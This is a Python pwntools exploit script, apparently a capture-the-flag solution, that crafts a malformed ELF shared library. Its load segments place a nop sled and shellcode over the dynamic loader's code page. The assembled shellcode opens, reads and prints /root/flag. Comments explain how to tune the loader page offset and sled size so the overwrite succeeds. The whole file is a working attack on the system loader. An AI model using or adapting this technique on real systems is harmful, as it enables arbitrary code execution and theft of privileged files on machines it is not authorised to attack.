from pwn import *

context.arch = 'amd64'

ET_DYN = 3
ET_EXEC = 4

PT_LOAD = 1
PT_DYNAMIC = 2
PT_INTERP = 3
PT_PHDR = 6

FLAG_READ = 4
FLAG_WRITE = 2
FLAG_EXEC = 1

DT_NULL = 0
DT_NEEDED = 1
DT_STRTAB = 5
DT_SYMTAB = 6
DT_DEBUG = 21
DT_RUNPATH = 29

def craftEhdr64(e_entry,e_phoff,e_phnum,e_shoff,e_shnum,e_shstrndx,e_ehsize=0x40,e_phentsize=0x38,e_shentsize=0x40,e_flags=0,e_type=3,e_machine=0x3e,e_version=1,EI_CLASS=2,EI_DATA=1,EI_VERSION=1,EI_OSABI=0,EI_PAD=0):
    return b'\x7fELF'+p8(EI_CLASS)+p8(EI_DATA)+p8(EI_VERSION)+p8(EI_OSABI)+p64(EI_PAD)+p16(e_type)+p16(e_machine)+p32(e_version)+p64(e_entry)+p64(e_phoff)+p64(e_shoff)+p32(e_flags)+p16(e_ehsize)+p16(e_phentsize)+p16(e_phnum)+p16(e_shentsize)+p16(e_shnum)+p16(e_shstrndx)

def craftPhdr64(p_type,p_flags,p_offset,p_vaddr,p_paddr,p_filesz,p_memsz,p_align):
    return p32(p_type)+p32(p_flags)+p64(p_offset)+p64(p_vaddr)+p64(p_paddr)+p64(p_filesz)+p64(p_memsz)+p64(p_align)

def craftDyn64(d_tag,d_ptr=0,d_val=0):
    if d_ptr!=0 and d_val!=0:
        print('d_ptr and d_val are union')
        exit()
    return p64(d_tag)+p64(d_ptr+d_val)

phdrcnt = 5
dyncnt = 3

# A brutal way to make this work is to assign small LD_PAGE_OFFSET and large SLED_SIZE,
# io time increases though, so ideally we should still strike a balance
LD_PAGE_OFFSET = 0x22000 # Should usually work, change vaddr here to correct offset from ld page if it doesn't
SLED_SIZE = 0x10000 # The size of nop sled + payload that overwrites ld text

ehdr = craftEhdr64(e_entry=0,e_phoff=0x40,e_phnum=phdrcnt,e_shoff=0,e_shnum=0,e_shstrndx=0)
phdr = craftPhdr64(p_type=PT_PHDR,
                   p_flags=FLAG_READ,
                   p_offset=0x40,p_vaddr=0x40,p_paddr=0x40,
                   p_filesz=0x38*phdrcnt,p_memsz=0x38*phdrcnt,
                   p_align=8)+\
       craftPhdr64(p_type=PT_DYNAMIC,
                   p_flags=FLAG_READ,
                   p_offset=0x40+0x38*phdrcnt,p_vaddr=0x40+0x38*phdrcnt,p_paddr=0x40+0x38*phdrcnt,
                   p_filesz=0x10*dyncnt,p_memsz=0x10*dyncnt,
                   p_align=0x1)+\
       craftPhdr64(p_type=PT_LOAD,
                   p_flags=FLAG_READ|FLAG_WRITE|FLAG_EXEC,
                   p_offset=0,p_vaddr=0,p_paddr=0,
                   p_filesz=0x40+0x38*phdrcnt+0x10*dyncnt+0x10,p_memsz=0x1000,
                   p_align=0x1000)+\
       craftPhdr64(p_type=PT_LOAD,
                   p_flags=FLAG_READ|FLAG_WRITE|FLAG_EXEC,
                   p_offset=0x1000,p_vaddr=LD_PAGE_OFFSET,p_paddr=LD_PAGE_OFFSET,
                   p_filesz=SLED_SIZE,p_memsz=SLED_SIZE,
                   p_align=0x1000)+\
       craftPhdr64(p_type=PT_LOAD,
                   p_flags=FLAG_READ|FLAG_WRITE|FLAG_EXEC,
                   p_offset=0,p_vaddr=0x1000,p_paddr=0x1000,
                   p_filesz=0,p_memsz=0x1000,
                   p_align=0x1000)

dyn = craftDyn64(d_tag=DT_STRTAB,d_ptr=0x40+0x38*phdrcnt+0x10*dyncnt)+\
      craftDyn64(d_tag=DT_SYMTAB,d_val=0)+\
      craftDyn64(d_tag=DT_NULL,d_val=0)

shell = asm(f'''
             mov rdi, {u64(b'ag'+p8(0)*6)}
             push rdi
             mov rdi, {u64(b'/root/fl')}
             push rdi
             mov rdi, rsp
             mov rsi, 0
             mov rdx, 0
             mov rax, 2
             syscall

             mov rdi, rax
             mov rsi, rsp
             mov rdx, 0x100
             mov rax, 0
             syscall

             mov rdi, 1
             mov rsi, rsp
             mov rdx, 0x100
             mov rax, 1
             syscall

             mov rax, 0x3c
             mov rdi, 0
             syscall
             ''')

payload = ehdr+phdr+dyn
payload = payload.ljust(0x1000,b'\x00')+shell.rjust(SLED_SIZE,b'\x90')
with open('libexp.so','wb') as f:
    f.write(payload)
